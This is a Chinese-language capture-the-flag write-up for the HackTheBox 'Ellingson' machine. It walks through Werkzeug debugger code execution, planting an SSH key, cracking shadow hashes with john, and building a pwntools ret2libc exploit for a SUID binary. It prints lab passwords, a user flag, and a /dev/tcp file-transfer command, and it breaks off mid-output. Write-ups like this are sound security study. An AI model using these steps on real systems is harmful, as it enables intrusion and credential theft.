{"pageProps":{"postData":{"id":"HackTheBoxMachine - Ellingson","contentHtml":"<h1>Machine - Ellingson</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Ellingson\">https://app.hackthebox.com/machines/Ellingson</a> | <code>Linux</code> | <code>Hard</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">➜  Ellingson nmap -sT -min-rate 5000 10.10.10.139\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.10.139\nHost is up (0.062s latency).\nNot shown: 886 closed tcp ports (conn-refused), 112 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 0.59 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Ellingson nmap -sT -A -p 22,80 10.10.10.139   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.10.139\nHost is up (0.056s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)\n|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:<span class=\"hljs-built_in\">df</span> (ECDSA)\n|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n| http-title: Ellingson Mineral Corp\n|_Requested resource was http://10.10.10.139/index\n|_http-server-header: nginx/1.14.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   324.20 ms 10.10.16.1\n2   43.94 ms  10.10.10.139\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 12.57 seconds\n</code></pre>\n<p>访问<code>HTTP</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image1.png\" alt=\"image.png\"></p>\n<p>内容告诉我们他们被<code>Ellingson</code>病毒给勒索了，并且短时间内不能访问服务超过五次，否则会被<code>ban</code> (目录扫描也不行)</p>\n<p>得到常见密码，这里可能存在弱密码</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image2.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image3.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\"> Love,Secret,Sex,God\n</code></pre>\n<pre><code class=\"hljs language-bash\">Margo Wallace\nEugene Belford\nDuke Ellingson\nHal\n</code></pre>\n<p>一个一个用户尝试之后没结果</p>\n<h2>Traceback 命令执行</h2>\n<p>网页是由<code>Werkzeug</code>驱动的，并且异常处理是<code>Traceback</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image4.png\" alt=\"image.png\"></p>\n<p>貌似说可以命令执行</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image5.png\" alt=\"image.png\"></p>\n<p>成功执行 <code>py</code> 语句</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image6.png\" alt=\"image.png\"></p>\n<h2>SSH 公钥</h2>\n<p>反弹 <code>shell</code> ，这里怎么弹都没法弹过来</p>\n<p>我们尝试写公钥</p>\n<pre><code class=\"hljs language-bash\">>>> import os;<span class=\"hljs-built_in\">print</span>(os.popen(<span class=\"hljs-string\">'whoami'</span>).<span class=\"hljs-built_in\">read</span>())\nhal\n\n>>> import os;<span class=\"hljs-built_in\">print</span>(os.popen(<span class=\"hljs-string\">'pwd'</span>).<span class=\"hljs-built_in\">read</span>())\n/\n\n>>> import os;<span class=\"hljs-built_in\">print</span>(os.popen(<span class=\"hljs-string\">'ls -al /home/hal'</span>).<span class=\"hljs-built_in\">read</span>())\ntotal 36\ndrwxrwx--- 5 hal  hal  4096 Jul 16  2021 .\ndrwxr-xr-x 6 root root 4096 Jul 16  2021 ..\n-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout\n-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc\ndrwx------ 2 hal  hal  4096 Jul 16  2021 .cache\ndrwx------ 3 hal  hal  4096 Jul 16  2021 .gnupg\n-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile\ndrwx------ 2 hal  hal  4096 Jun 13 00:54 .ssh\n-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo\n\n>>> import os;<span class=\"hljs-built_in\">print</span>(os.popen(<span class=\"hljs-string\">'echo \\\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPj1PrDHdIKBOR5DxZjrQD5M3R4yRyMdJqSEDwP6SCfe root@kali\\\" > /home/hal/.ssh/authorized_keys'</span>).<span class=\"hljs-built_in\">read</span>())\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image7.png\" alt=\"image.png\"></p>\n<h2>Crack Shadow</h2>\n<p>发现<code>hal</code>用户所属有趣的组</p>\n<pre><code class=\"hljs language-bash\">hal@ellingson:~$ <span class=\"hljs-built_in\">id</span>\nuid=1001(hal) gid=1001(hal) <span class=\"hljs-built_in\">groups</span>=1001(hal),4(adm)\n</code></pre>\n<p>查找 <code>group</code>组有权限的文件</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image8.png\" alt=\"image.png\"></p>\n<p>发现<code>shadow.bak</code></p>\n<pre><code class=\"hljs language-bash\">hal@ellingson:~$ <span class=\"hljs-built_in\">cat</span> /var/backups/shadow.bak \nroot:*:17737:0:99999:7:::\ndaemon:*:17737:0:99999:7:::\nbin:*:17737:0:99999:7:::\nsys:*:17737:0:99999:7:::\n<span class=\"hljs-built_in\">sync</span>:*:17737:0:99999:7:::\ngames:*:17737:0:99999:7:::\nman:*:17737:0:99999:7:::\nlp:*:17737:0:99999:7:::\nmail:*:17737:0:99999:7:::\nnews:*:17737:0:99999:7:::\nuucp:*:17737:0:99999:7:::\nproxy:*:17737:0:99999:7:::\nwww-data:*:17737:0:99999:7:::\nbackup:*:17737:0:99999:7:::\nlist:*:17737:0:99999:7:::\nirc:*:17737:0:99999:7:::\ngnats:*:17737:0:99999:7:::\nnobody:*:17737:0:99999:7:::\nsystemd-network:*:17737:0:99999:7:::\nsystemd-resolve:*:17737:0:99999:7:::\nsyslog:*:17737:0:99999:7:::\nmessagebus:*:17737:0:99999:7:::\n_apt:*:17737:0:99999:7:::\nlxd:*:17737:0:99999:7:::\nuuidd:*:17737:0:99999:7:::\ndnsmasq:*:17737:0:99999:7:::\nlandscape:*:17737:0:99999:7:::\npollinate:*:17737:0:99999:7:::\nsshd:*:17737:0:99999:7:::\ntheplague:$6$.5ef7Dajxto8Lz3u<span class=\"hljs-variable\">$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj</span>/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::\nhal:$6<span class=\"hljs-variable\">$UYTy</span>.cHj<span class=\"hljs-variable\">$qGyl</span>.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::\nmargo:$6$Lv8rcvK8<span class=\"hljs-variable\">$la</span>/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::\nduke:$6$bFjry0BT<span class=\"hljs-variable\">$OtPFpMfL</span>/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::\n</code></pre>\n<p><code>john</code>破解</p>\n<pre><code class=\"hljs language-bash\">➜  Ellingson john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\npassword123      (theplague)     \niamgod<span class=\"hljs-variable\">$08</span>        (margo)     \n2g 0:01:56:26 DONE (2025-06-13 14:56) 0.000286g/s 2053p/s 3123c/s 3123C/s !!!playboy!!!7..*7¡Vamos!\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>的到两个密码，其中<code>theplague</code>的密码是不正确的，<code>margo</code>的密码是正确的</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image9.png\" alt=\"image.png\"></p>\n<p><code>margo</code>用户可以拿到<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">margo@ellingson:~$ <span class=\"hljs-built_in\">cat</span> user.txt \ne6e956999a23f338ffd6d933bf79ca9c\n</code></pre>\n<h2>缓冲区溢出</h2>\n<h3>检查程序</h3>\n<p>这里大致看了一会感觉没什么问题</p>\n<pre><code class=\"hljs language-bash\">margo@ellingson:~$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/usr/bin/at              \n/usr/bin/newgrp       \n/usr/bin/pkexec           \n/usr/bin/passwd             \n/usr/bin/gpasswd            \n/usr/bin/garbage               \n/usr/bin/newuidmap            \n/usr/bin/sudo                 \n/usr/bin/traceroute6.iputils\n/usr/bin/chfn\n/usr/bin/newgidmap                         \n/usr/bin/chsh                             \n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/bin/su                     \n/bin/umount                 \n/bin/ntfs-3g                   \n/bin/ping                     \n/bin/mount                    \n/bin/fusermount\n</code></pre>\n<p>但是问题出现在<code>garbage</code> ，我以为它是<code>gc</code>（Garbage Collection）</p>\n<p>运行它的时候，会让你输入密码</p>\n<pre><code class=\"hljs language-bash\">margo@ellingson:~$ garbage\nEnter access password: 111111111111111111111111111111111111111111111111111111\n\naccess denied.\n</code></pre>\n<p>拉出去逆向看一眼</p>\n<pre><code class=\"hljs language-bash\">int __fastcall __noreturn main(int argc, const char **argv, const char **envp)\n{\n  int v3; // [rsp+8h] [rbp-8h] BYREF\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  v4 = check_user(argc, argv, envp);\n  set_username(v4);\n  <span class=\"hljs-keyword\">if</span> ( !(unsigned int)auth(v4) )\n    <span class=\"hljs-built_in\">exit</span>(-1);\n  puts(<span class=\"hljs-string\">\"[+] W0rM || Control Application\"</span>);\n  puts(<span class=\"hljs-string\">\"[+] ---------------------------\"</span>);\n  puts(<span class=\"hljs-string\">\"Select Option\"</span>);\n  puts(<span class=\"hljs-string\">\"1: Check Balance\"</span>);\n  puts(<span class=\"hljs-string\">\"2: Launch\"</span>);\n  puts(<span class=\"hljs-string\">\"3: Cancel\"</span>);\n  puts(<span class=\"hljs-string\">\"4: Exit\"</span>);\n  <span class=\"hljs-keyword\">while</span> ( 1 )\n  {\n    <span class=\"hljs-keyword\">while</span> ( 1 )\n    {\n      <span class=\"hljs-keyword\">while</span> ( 1 )\n      {\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"> \"</span>);\n        __isoc99_scanf(<span class=\"hljs-string\">\"%d%*c\"</span>, &#x26;v3);\n        <span class=\"hljs-keyword\">if</span> ( v3 != 2 )\n          <span class=\"hljs-built_in\">break</span>;\n        launch();\n      }\n      <span class=\"hljs-keyword\">if</span> ( v3 > 2 )\n        <span class=\"hljs-built_in\">break</span>;\n      <span class=\"hljs-keyword\">if</span> ( v3 != 1 )\n        goto LABEL_14;\n      checkbalance();\n    }\n    <span class=\"hljs-keyword\">if</span> ( v3 != 3 )\n    {\n      <span class=\"hljs-keyword\">if</span> ( v3 == 4 )\n        <span class=\"hljs-built_in\">exit</span>(0);\nLABEL_14:\n      puts(<span class=\"hljs-string\">\"Unknown option\"</span>);\n      <span class=\"hljs-built_in\">exit</span>(-1);\n    }\n    cancel();\n  }\n}\n</code></pre>\n<p>我们在开始运行的 <code>auth</code> 函数中发现了存在缓冲区溢出漏洞</p>\n<p>也就是让我们输入密码的地方，会有缓冲区溢出，<code>gets()</code> 函数会无限制地读取用户的输入，直到遇到换行符。如果攻击者输入一个超长的字符串（例如<code>200</code>个字符），多出来的<code>100</code>个字符就会溢出，覆盖掉栈上 <code>s1</code> 相邻的其他数据。</p>\n<pre><code class=\"hljs language-bash\">__int64 __fastcall auth(int a1)\n{\n  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF\n  char s1[100]; // [rsp+80h] [rbp-80h] BYREF\n  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF\n  int v5; // [rsp+F0h] [rbp-10h]\n\n  v5 = a1;\n  strcpy(v4, username);\n  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Enter access password: \"</span>);\n  gets(s1);\n  putchar(10);\n  <span class=\"hljs-keyword\">if</span> ( !strcmp(s1, <span class=\"hljs-string\">\"N3veRF3@r1iSh3r3!\"</span>) )\n  {\n    strcpy(dest, <span class=\"hljs-string\">\"access granted for user: \"</span>);\n    strcat(dest, v4);\n    syslog(6, dest);\n    puts(<span class=\"hljs-string\">\"access granted.\"</span>);\n    <span class=\"hljs-built_in\">return</span> 1LL;\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    puts(<span class=\"hljs-string\">\"access denied.\"</span>);\n    <span class=\"hljs-built_in\">return</span> 0LL;\n  }\n}\n</code></pre>\n<p><code>64</code>位程序</p>\n<pre><code class=\"hljs language-bash\">➜  Ellingson file garbage \ngarbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class=\"hljs-keyword\">for</span> GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped\n</code></pre>\n<p>保护措施情况，开启了<code>NX</code></p>\n<pre><code class=\"hljs language-bash\">➜  Ellingson checksec garbage \n[*] Checking <span class=\"hljs-keyword\">for</span> new versions of pwntools\n    To <span class=\"hljs-built_in\">disable</span> this functionality, <span class=\"hljs-built_in\">set</span> the contents of /root/.cache/.pwntools-cache-3.13/update to <span class=\"hljs-string\">'never'</span> (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n</code></pre>\n<p>检查一下是否开启了 <code>ALSR</code> ，开启了完全<code>ALSR</code></p>\n<pre><code class=\"hljs language-bash\">margo@ellingson:~$ <span class=\"hljs-built_in\">cat</span> /proc/sys/kernel/randomize_va_space\n2\n</code></pre>\n<p>这里要使用 <code>ret2libc</code> 攻击</p>\n<h3>寻找一个真实的地址</h3>\n<p>首先我们查看<code>libc</code>文件</p>\n<pre><code class=\"hljs language-bash\">margo@ellingson:~$ ldd /usr/bin/garbage \n        linux-vdso.so.1 (0x00007ffcd37ec000)\n        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)\n</code></pre>\n<p>将<code>/lib/x86_64-linux-gnu/libc.so.6</code>下载到靶机中</p>\n<pre><code class=\"hljs language-bash\">// kali\n➜  Ellingson nc -lvp 1234 > libc.so.6\n// Machine\nmargo@ellingson:~$ <span class=\"hljs-built_in\">cat</span> /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234\n</code></pre>\n<p>首先判断填充值，这里使用<code>garbage</code></p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson pwndbg garbage \npwndbg> cyclic 1024\naaaabaaacaaadaaa...acwaacxaacyaac\npwndbg> run\nStarting program: /root/Desktop/HackTheBox/Ellingson/garbage \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library <span class=\"hljs-string\">\"/lib/x86_64-linux-gnu/libthread_db.so.1\"</span>.\nEnter access password:aaaabaaacaaadaaa...acwaacxaacyaac\n</code></pre>\n<p>程序果不其然崩溃了</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image10.png\" alt=\"image.png\"></p>\n<p>计算偏移值，这里使用<code>msf</code></p>\n<pre><code class=\"hljs language-bash\">➜  Ellingson /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image11.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">pwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 136\n</code></pre>\n<p>得到偏移值<code>136</code> （PS：这里使用<code>pwndbg</code>的<code>cyclic</code>无法得到正确偏移值，但是<code>WP</code>中使用<code>gef</code>等都可以很容易就得到偏移值）</p>\n<p>得到偏移值后，我们选择一下获得哪个<code>plt</code>函数的真实地址</p>\n<pre><code class=\"hljs language-bash\">pwndbg> plt\nSection .plt 0x401020 - 0x401170:\n0x401030: putchar@plt\n0x401040: strcpy@plt\n0x401050: puts@plt\n0x401060: fclose@plt\n0x401070: getpwuid@plt\n0x401080: getuid@plt\n0x401090: <span class=\"hljs-built_in\">printf</span>@plt\n0x4010a0: rewind@plt\n0x4010b0: fgetc@plt\n0x4010c0: <span class=\"hljs-built_in\">read</span>@plt\n0x4010d0: fgets@plt\n0x4010e0: strcmp@plt\n0x4010f0: getchar@plt\n0x401100: gets@plt\n0x401110: syslog@plt\n0x401120: access@plt\n0x401130: fopen@plt\n0x401140: __isoc99_scanf@plt\n0x401150: strcat@plt\n0x401160: <span class=\"hljs-built_in\">exit</span>@plt\n</code></pre>\n<p><code>x64</code> 传参需要使用寄存器，<code>0x000000000040179b</code> 符合</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson ROPgadget --binary garbage --only <span class=\"hljs-string\">\"pop|ret\"</span>\nGadgets information\n============================================================\n0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401798 : pop r14 ; pop r15 ; ret\n0x000000000040179a : pop r15 ; ret\n0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000401239 : pop rbp ; ret\n0x000000000040179b : pop rdi ; ret\n0x0000000000401799 : pop rsi ; pop r15 ; ret\n0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\nUnique gadgets found: 15\n</code></pre>\n<p>这里选择获得<code>puts@plt</code> ，我们通过<code>pwn</code>连接<code>ssh</code> 来调试</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_add = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_add:{hex(puts_real_add)}\"</span>)\n</code></pre>\n<p>运行后我们的得到了<code>put</code>的真实地址<code>0x7f8eed3569c0</code></p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson python exp.py                              \n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21277\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/usr/bin/garbage'</span>!\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/libc.so.6'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_add = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\nputs_real_add:0x7f8eed3569c0\n</code></pre>\n<h3>得到基地址</h3>\n<p>基地址 = puts 函数真实地址 - puts 函数偏移地址</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr:{hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase:{hex(libcbase)}\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21460\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/usr/bin/garbage'</span>!\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/libc.so.6'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\nputs_real_addr:0x7f7ed83509c0\nlibcbase:0x7f7ed82d0000\n</code></pre>\n<h3>获得其他地址</h3>\n<p>得到基地址后，我们要得到 <code>system</code> 和 <code>/bin/sh</code>的地址</p>\n<p>函数真实地址 = 基地址 + 函数偏移值</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr:{hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase:{hex(libcbase)}\"</span>)\n\nsystem_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_addr:{hex(system_addr)}\"</span>)\n\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21644\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/usr/bin/garbage'</span>!\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/libc.so.6'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(<span 